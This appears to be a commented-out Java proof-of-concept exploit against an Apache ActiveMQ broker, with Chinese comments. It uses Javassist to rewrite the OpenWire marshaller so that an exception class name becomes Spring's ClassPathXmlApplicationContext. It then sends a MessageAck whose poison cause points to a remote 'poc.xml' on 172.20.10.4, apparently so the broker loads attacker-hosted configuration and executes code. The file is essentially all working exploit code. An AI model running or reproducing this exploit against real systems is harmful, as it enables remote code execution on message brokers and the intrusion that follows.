//package com.example;
//
//import javassist.ClassPool;
//import javassist.CtClass;
//import javassist.CtMethod;
//import org.apache.activemq.ActiveMQConnection;
//import org.apache.activemq.ActiveMQConnectionFactory;
//import org.apache.activemq.command.ActiveMQMessage;
//import org.apache.activemq.command.MessageAck;
//
//import javax.jms.*;
//import java.lang.reflect.Constructor;
//import java.lang.reflect.Method;
//
//public class Demo {
//    public static void main(String[] args) throws Exception {
//        // 创建一个 ConnectionFactory 对象
//        ActiveMQConnectionFactory factory = new ActiveMQConnectionFactory("tcp://127.0.0.1:61616");
//
//        // 使用 ConnectionFactory 创建一个 Connection
//        Connection connection = factory.createConnection();
//
//        // 启动 Connection
//        connection.start();
//
//        // 创建一个 Session
//        Session session = connection.createSession(false, Session.AUTO_ACKNOWLEDGE);
//
//        // 创建一个 Destination
//        Destination destination = session.createQueue("MY.QUEUE");
//
//        // 创建一个消费者
//        MessageConsumer consumer = session.createConsumer(destination);
//
//        // 消费消息
//        Message message = consumer.receive();
//
//        // 创建一个 Javassist 修改的类
//        try {
//            ClassPool pool = ClassPool.getDefault();
//            CtClass cc = pool.get("org.apache.activemq.openwire.v12.BaseDataStreamMarshaller");
//            CtMethod method = cc.getDeclaredMethod("tightMarshalString2");
//            method.insertBefore("if ($1 != null && $1.equals(\"java.lang.Exception\")) { $1 = \"org.springframework.context.support.ClassPathXmlApplicationContext\"; }");
//
//            Class<?> modifiedClass = cc.toClass();
//            Constructor<?> constructor = modifiedClass.getConstructor();
//            Object modifiedObject = constructor.newInstance();
//            Method customMethod = modifiedClass.getMethod("customMethod");
//            customMethod.invoke(modifiedObject);
//        } catch (Exception e) {
//            e.printStackTrace();
//        }
//
//        // 创建 MessageAck 对象并设置异常消息
//        MessageAck ack = new MessageAck((ActiveMQMessage) message, MessageAck.STANDARD_ACK_TYPE, 1);
//        ack.setPoisonCause(new Exception("http://172.20.10.4/poc.xml"));
//
//        // 使用 ActiveMQConnection 的 getTransportChannel().oneway() 方法发送 MessageAck
//        ((ActiveMQConnection)connection).getTransportChannel().oneway(ack);
//
//        // 关闭资源
//        consumer.close();
//        session.close();
//        connection.close();
//    }
//}
